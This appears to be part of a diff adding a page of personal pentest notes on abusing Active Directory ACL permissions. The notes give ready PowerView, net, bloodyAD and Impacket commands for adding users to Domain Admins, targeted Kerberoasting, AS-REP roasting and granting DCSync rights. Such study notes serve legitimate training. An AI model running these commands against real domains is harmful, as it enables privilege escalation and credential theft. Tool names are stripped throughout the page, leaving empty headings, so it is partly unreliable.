%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c---------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Right:%20GenericAll%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%28Take%20Control%20of%20Target%20Admin%20User%29%20&#43;#Vertical%20Move#&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20V%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20adunn/Target%20Admin%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c---------------------%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20Right:%20Admin%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&#43;---------------------&#43;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>+--------------------------+                       +-----------------------+
+</span></span><span style="display:flex;"><span>|    wley/Current User     |    +#Lateral Move#+   | damundsen/Target User |
+</span></span><span style="display:flex;"><span>|--------------------------|                       |-----------------------|
+</span></span><span style="display:flex;"><span>|        Right: N/A        |---<span style="color:#f92672">(</span>Change Password<span style="color:#f92672">)</span>--&gt;|   Right: GenericAll   |
+</span></span><span style="display:flex;"><span>+--------------------------+                       +-----------------------+
+</span></span><span style="display:flex;"><span>                                                                |
+</span></span><span style="display:flex;"><span>                                                                | <span style="color:#f92672">(</span>Add to Help Desk Level <span style="color:#ae81ff">1</span> Group<span style="color:#f92672">)</span> +#Vertical Move#+
+</span></span><span style="display:flex;"><span>                                                                V
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                        | Help Desk Level <span style="color:#ae81ff">1</span>   |
+</span></span><span style="display:flex;"><span>                                                        |       Group         |
+</span></span><span style="display:flex;"><span>                                                        |---------------------|
+</span></span><span style="display:flex;"><span>                                                        | Right: N/A          |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                                |   ^
+</span></span><span style="display:flex;"><span>                                         <span style="color:#f92672">(</span>Inherited Permissions<span style="color:#f92672">)</span>|   |
+</span></span><span style="display:flex;"><span>                                                                |   |
+</span></span><span style="display:flex;"><span>                                                                V   |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                        | Information Tech    |
+</span></span><span style="display:flex;"><span>                                                        |       Group         |
+</span></span><span style="display:flex;"><span>                                                        |---------------------|
+</span></span><span style="display:flex;"><span>                                                        | Right: GenericAll   |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                                |
+</span></span><span style="display:flex;"><span>                                                                | <span style="color:#f92672">(</span>Take Control of Target Admin User<span style="color:#f92672">)</span> +#Vertical Move#+
+</span></span><span style="display:flex;"><span>                                                                V
+</span></span><span style="display:flex;"><span>                                                        +---------------------+
+</span></span><span style="display:flex;"><span>                                                        | adunn/Target Admin  |
+</span></span><span style="display:flex;"><span>                                                        |---------------------|
+</span></span><span style="display:flex;"><span>                                                        | Right: Admin        |
+</span></span><span style="display:flex;"><span>                                                        +---------------------+</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h4 id="abusing-genericall-permission-for-full-access-using">Abusing GenericAll Permission for full access using :</h4>
+<ul>
+<li>
+<p>Grants full control over target object. Can modify group membership, force password changes, or execute targeted .</p>
+</li>
+<li>
+<p><del>Linux</del>:</p>
+<ul>
+<li>
+<h2 id="pth-net-rpc-group-addmem">pth-net rpc group addmem</h2>
+<ul>
+<li>pth-net rpc password</li>
+<li></li>
+</ul>
+</li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall</a></li>
+</ul>
+</li>
+<li>
+<p><strong>GenericAll on User</strong> : <del>We can reset user&rsquo;s password without knowing the current password</del></p>
+</li>
+<li>
+<p><strong>GenericAll on Group</strong> : <del>Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group</del></p>
+<ul>
+<li>
+<p><!-- raw HTML omitted -->On Windows<!-- raw HTML omitted -->:</p>
+<ul>
+<li>
+<ul>
+<li><code>Command</code>: net group &ldquo;&lt;GroupName&gt;&rdquo; &lt;UserName&gt; /add /domain</li>
+<li><del>Example</del>: net group &ldquo;domain admins&rdquo; hacker /add /domain</li>
+<li><del>Note:</del> The <code>/domain</code> just specifies that hte command should be carried out on the DC itself, we do not need to specify domain name etc.</li>
+</ul>
+</li>
+<li>:
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember -Identity &lsquo;&lt;GroupName&gt;&rsquo; -Members &lsquo;&lt;UserToAdd&gt;&rsquo;</li>
+<li><del>Example</del>: Add-DomainGroupMember -Identity &lsquo;Domain Admins&rsquo; -Members &lsquo;hackerMan&rsquo;</li>
+<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/">https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->On Linux<!-- raw HTML omitted -->:</p>
+<ul>
+<li><!-- raw HTML omitted -->Using the Samba software suite<!-- raw HTML omitted -->:
+<ul>
+<li><code>Command</code>: net rpc group ADDMEM &ldquo;&lt;GroupName&gt;&rdquo; UserToAdd -U &lsquo;&lt;NewUserName&gt;%&lt;NewPassword&gt;&rsquo; -W &lt;DOMAIN&gt; -I [&lt;DC_IP&gt;]</li>
+<li><del>Example</del>: net rpc group ADDMEM &ldquo;Domain Admins&rdquo; UserToAdd -U &lsquo;hacker%MyPassword123&rsquo; -W INLANEFEREIGHT.LOCAL -I [172.16.7.3]</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Using<!-- raw HTML omitted --> :
+<ul>
+<li><code>Command</code>: bloodyAD.py &ndash;host [&lt;DC_IP&gt;] -d DomainName -u &lt;NewUserName&gt; -p &lt;NewPassword&gt; addObjectToGroup UserToAdd &lsquo;&lt;GroupName&gt;&rsquo;</li>
+<li><del>Example</del>: bloodyAD.py &ndash;host [172.16.7.3] -d INLANEFRIEGHT.LOCAL -u hacker -p MyPassword123 addObjectToGroup UserToAdd &lsquo;GROUP NAME&rsquo;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>GenericAll/GenericWrite</strong> : We can set a <strong>SPN</strong> on a target account,
+request a Service Ticket (ST), then grab its hash and kerberoast it.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  <span style="color:#75715e"># Check for interesting permissions on accounts:</span>
+</span></span><span style="display:flex;"><span>  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;RDPUsers&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Check if current user has already an SPN setted:</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Force set the SPN on the account: Targeted Kerberoasting</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=<span style="color:#e6db74">&#39;ops/whatever1&#39;</span>}
+</span></span><span style="display:flex;"><span>  PowerView3 &gt; Set-DomainObject -Identity &lt;UserName&gt; -Set @{serviceprincipalname=<span style="color:#e6db74">&#39;any/thing&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Grab the ticket</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; $User = Get-DomainUser username
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; $User | Get-DomainSPNTicket | fl
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; $User | Select serviceprincipalname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Remove the SPN</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Set-DomainObject -Identity username -Clear serviceprincipalname</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>GenericAll/GenericWrite</strong> : We can change a victim&rsquo;s <strong>userAccountControl</strong> to not require Kerberos preauthentication, grab the user&rsquo;s crackable AS-REP, and then change the setting back.</p>
+<ul>
+<li>On Windows:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20#%20Modify%20the%20userAccountControl%0a%20%20PowerView2%20%3e%20Get-DomainUser%20username%20%7c%20ConvertFrom-UACValue%0a%20%20PowerView2%20%3e%20Set-DomainObject%20-Identity%20username%20-XOR%20@%7buseraccountcontrol=4194304%7d%20-Verbose%0a%0a%20%20#%20Grab%20the%20ticket%0a%20%20PowerView2%20%3e%20Get-DomainUser%20username%20%7c%20ConvertFrom-UACValue%0a%20%20ASREPRoast%20%3e%20Get-ASREPHash%20-Domain%20domain.local%20-UserName%20username%0a%0a%20%20#%20Set%20back%20the%20userAccountControl%0a%20%20PowerView2%20%3e%20Set-DomainObject%20-Identity%20username%20-XOR%20@%7buseraccountcontrol=4194304%7d%20-Verbose%0a%20%20PowerView2%20%3e%20Get-DomainUser%20username%20%7c%20ConvertFrom-UACValue">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  <span style="color:#75715e"># Modify the userAccountControl</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=<span style="color:#ae81ff">4194304</span>} -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Grab the ticket</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue
+</span></span><span style="display:flex;"><span>  ASREPRoast &gt; Get-ASREPHash -Domain domain.local -UserName username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Set back the userAccountControl</span>
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=<span style="color:#ae81ff">4194304</span>} -Verbose
+</span></span><span style="display:flex;"><span>  PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>On Linux:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20#%20Modify%20the%20userAccountControl%0a%20%20$%20bloodyAD.py%20--host%20[DC%20IP]%20-d%20[DOMAIN]%20-u%20[AttackerUser]%20-p%20[MyPassword]%20setUserAccountControl%20[Target_User]%200x400000%20True%0a%0a%20%20#%20Grab%20the%20ticket%0a%20%20$%20GetNPUsers.py%20DOMAIN/target_user%20-format%20%3cAS_REP_responses_format%20[hashcat%20%7c%20john]%3e%20-outputfile%20%3coutput_AS_REP_responses_file%3e%0a%0a%20%20#%20Set%20back%20the%20userAccountControl%0a%20%20$%20bloodyAD.py%20--host%20[DC%20IP]%20-d%20[DOMAIN]%20-u%20[AttackerUser]%20-p%20[MyPassword]%20setUserAccountControl%20[Target_User]%200x400000%20False">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  <span style="color:#75715e"># Modify the userAccountControl</span>
+</span></span><span style="display:flex;"><span>  $ bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d <span style="color:#f92672">[</span>DOMAIN<span style="color:#f92672">]</span> -u <span style="color:#f92672">[</span>AttackerUser<span style="color:#f92672">]</span> -p <span style="color:#f92672">[</span>MyPassword<span style="color:#f92672">]</span> setUserAccountControl <span style="color:#f92672">[</span>Target_User<span style="color:#f92672">]</span> 0x400000 True
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Grab the ticket</span>
+</span></span><span style="display:flex;"><span>  $ GetNPUsers.py DOMAIN/target_user -format &lt;AS_REP_responses_format <span style="color:#f92672">[</span>hashcat | john<span style="color:#f92672">]</span>&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Set back the userAccountControl</span>
+</span></span><span style="display:flex;"><span>  $ bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d <span style="color:#f92672">[</span>DOMAIN<span style="color:#f92672">]</span> -u <span style="color:#f92672">[</span>AttackerUser<span style="color:#f92672">]</span> -p <span style="color:#f92672">[</span>MyPassword<span style="color:#f92672">]</span> setUserAccountControl <span style="color:#f92672">[</span>Target_User<span style="color:#f92672">]</span> 0x400000 False</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h4 id="abusing-genericall-permission-to-add-a-user-to-a-group-using--can-lead-to">Abusing GenericAll Permission to add a user to a group using (can lead to ):</h4>
+<ul>
+<li>Requirements:
+<ul>
+<li>Our user must have GenericAll Permission over the group.</li>
+</ul>
+</li>
+<li>In the below example I have control over a user called ttimmons who in turn has genericall permissions over the Domain Admins group. I am logged into a different user though.</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->__<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->-</p>
+<ol>
+<li>
+<p><strong>Create Credential Object for User who has GenericWrite Privs</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20#%20Set%20Variables%20for%20credential%0a%20%20%20$domainUsername=%20%27INLANEFREIGHT%5cttimmons%27%20#%20e.g.%20%27INLANEFREIGHT%5cmssqladm%27%0a%20%20%20$SecPassword%20=%20ConvertTo-SecureString%20%27%3cpassword%3e%27%20-AsPlainText%20-Force%0a%0a%20%20%20#%20Passing%20in%20cred%20for%20domain%20user%0a%20%20%20$Cred%20=%20New-Object%20System.Management.Automation.PSCredential%28$domainUsername,%20$SecPassword%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>   <span style="color:#75715e"># Set Variables for credential</span>
+</span></span><span style="display:flex;"><span>   $domainUsername= <span style="color:#e6db74">&#39;INLANEFREIGHT\ttimmons&#39;</span> <span style="color:#75715e"># e.g. &#39;INLANEFREIGHT\mssqladm&#39;</span>
+</span></span><span style="display:flex;"><span>   $SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;password&gt;&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Passing in cred for domain user</span>
+</span></span><span style="display:flex;"><span>   $Cred = New-Object System.Management.Automation.PSCredential($domainUsername, $SecPassword)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><del>NOTE</del>: this is only necesseary if we are <del>NOT</del> logged in as the user.</li>
+</ul>
+</li>
+<li>
+<p><strong>Import Powerview</strong>:</p>
+<ul>
+<li><code>Command</code>: import-module powerview.ps1</li>
+</ul>
+</li>
+<li>
+<p><strong>Find SID of Group and put in variable</strong>:</p>
+<ul>
+<li><code>Command</code>: $group = Convert-NameToSid &ldquo;Server Admins&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>Add User to Group</strong>:</p>
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember -Identity $group -Members &rsquo;ttimmons&rsquo; -Credential $Cred -verbose</li>
+</ul>
+</li>
+</ol>
+<h3 id="abusing-exessive-user-rights-permissions">Abusing Exessive User Rights Permissions:</h3>
+<h4 id="abusing-execessive-user-rights-using">Abusing Execessive User Rights using :</h4>
+<ul>
+<li><!-- raw HTML omitted -->Description<!-- raw HTML omitted -->: Exploit user, computer, or group objects with rights they shouldn&rsquo;t have.</li>
+<li><!-- raw HTML omitted -->Impact<!-- raw HTML omitted -->: Gain unintended access or privileges.</li>
+<li><!-- raw HTML omitted -->Trigger Events<!-- raw HTML omitted -->:
+<ul>
+<li>Software installs (e.g., Exchange)</li>
+<li>Legacy configurations</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Tools<!-- raw HTML omitted -->:
+<ul>
+<li>
+<ul>
+<li><code>Command</code>: Set-DomainObject</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Remediation<!-- raw HTML omitted -->:
+<ul>
+<li>Conduct routine access audits.</li>
+</ul>
+</li>
+</ul>
+<h3 id="abusing-addmembers-permissions">Abusing AddMembers Permissions:</h3>
+<h4 id="abusing-addmembers-permissions-to-add-users-to-group">Abusing AddMembers Permissions to add users to group:</h4>
+<ul>
+<li>Adds users to target groups without permission checks.</li>
+<li><del>Windows</del>:
+<ul>
+<li>:
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember</li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>Command</code>: group</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><del>Linux</del>:
+<ul>
+<li>pth-net rpc group addmem</li>
+<li></li>
+<li></li>
+</ul>
+</li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers</a></li>
+</ul>
+<h3 id="abusing-addself-permissions">Abusing AddSelf Permissions:</h3>
+<h4 id="abusing-addself-permissions-to-add-user-to-group-by-using">Abusing AddSelf Permissions to add user to group by using :</h4>
+<ul>
+<li>AddSelf permission allows an object/user to add itself to a group without the need for an administrator.</li>
+<li>:
+<ul>
+<li><code>Command</code> Add-DomainGroupMember</li>
+<li>group</li>
+</ul>
+</li>
+<li><del>Linux</del>:
+<ul>
+<li>pth-net rpc group addmem</li>
+<li></li>
+<li></li>
+</ul>
+</li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addself">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addself</a></li>
+</ul>
+<h3 id="abusing-writedacl-permissions">Abusing WriteDACL Permissions:</h3>
+<ul>
+<li></li>
+</ul>
+<h4 id="abusing-writedacl-permissions-to-modify-acl-s-using">Abusing WriteDACL Permissions to modify ACL&rsquo;s using :</h4>
+<ul>
+<li>Allows modification of an object&rsquo;s ACL, potentially leading to privilege escalation.</li>
+<li>:
+<ul>
+<li>
+<p><code>Command</code>: Add-DomainObjectACL</p>
+</li>
+<li>
+<p><del>Example of giving a user DCSync Privs</del>:</p>
+<ol>
+<li><del>Example</del>: $pass = convertto-securestring &lsquo;abc123!&rsquo; -asplain -force</li>
+<li><del>Example</del>: $cred = new-object system.management.automation.pscredential(&lsquo;htb\billy&rsquo;, $pass)</li>
+<li><del>Example</del>: Add-objectACL -PrincipalIdentity billy -Credential $cred -Rights DCSync</li>
+</ol>
+<p>$pass = convertto-securestring &lsquo;abc123!&rsquo; -asplain -force
+$cred = new-object system.management.automation.pscredential(&lsquo;htb\billy&rsquo;, $pass)</p>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><del>Linux</del>:
+<ul>
+<li>N/A</li>
+</ul>
+</li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl</a></li>
+</ul>
+<h3 id="abusing-writeowner-permissions">Abusing WriteOwner Permissions:</h3>
+<h4 id="abusing-writeowner-permissions-to-change-object-ownership-using">Abusing WriteOwner Permissions to change object ownership using :</h4>
+<ul>
+<li>Allows changing the owner of an object, providing full control over it.</li>
+<li>:
+<ul>
+<li><code>Command</code>: Set-DomainObjectOwner</li>
+</ul>
+</li>
+<li>
+<h2 id="linux"><del>Linux</del>:</h2>
+</li>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner</a></li>
+</ul>
+<h3 id="abusing-genericwrite-permissions">Abusing GenericWrite Permissions:</h3>
+<ul>
+<li></li>
+<li><del>DACL Attack</del> !!!</li>
+</ul>
+<h4 id="abusing-genericwrite-permissions-using">Abusing GenericWrite Permissions using :</h4>
+<ul>
+<li>Allows writing to non-protected attributes.</li>
+<li><del>Enables Kerberoasting on users</del> (e.g. targeted kerberoasting) or adding members to groups.</li>
+<li>:
+<ul>
+<li><code>Command</code>: Set-DomainOject</li>
+</ul>
+</li>
+<li>
+<h2 id="linux-1"><del>Linux</del>:</h2>
+<ul>
+<li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="abusing-allextendedrights-permissions-using">Abusing AllExtendedRights Permissions using :</h3>
+<p>Similar to GenericAll, but extended to include all rights like sending email on behalf of a user.</p>
+<ul>
+<li>
+<p>:</p>
+<ul>
+<li><code>Command</code>: Add-DomainGroupMember</li>
+<li><code>Command</code>: Set-DomainUserPassword</li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>Command</code>: group</li>
+</ul>
+</li>
+<li>
+<p><del>Linux</del>:</p>
+<ul>
+<li>pth-net rpc group addmem</li>
+<li></li>
+<li>pth-net rpc password</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#allextendedrights&gt;
+</code></pre>
+<h3 id="add-user-to-domain-using-powersehll">Add User to Domain using Powersehll: <!-- raw HTML omitted --><!-- raw HTML omitted -->lol<!-- raw HTML omitted --><!-- raw HTML omitted --></h3>
+<ul>
+<li><code>Command</code>: net user &lt;newuserName&gt; &lt;newpassword&gt; /add /domain</li>
+<li><del>Example</del>: net user john abc123$ /add /domain</li>
+</ul>
+<h3 id="add-user-to-group-using-powershell">Add User to group using Powershell: <!-- raw HTML omitted --><!-- raw HTML omitted -->lol<!-- raw HTML omitted --><!-- raw HTML omitted --></h3>
+<ul>
+<li><code>Command</code>: net group &ldquo;&lt;GroupName&gt;&rdquo; &lt;user&gt; /add</li>
+<li><del>Example</del>: net group &ldquo;Domain Admins&rdquo; john /add</li>
+<li><del>Example</del>: net group &ldquo;Remote Management Users&rdquo; john /add</li>
+</ul>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2437
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
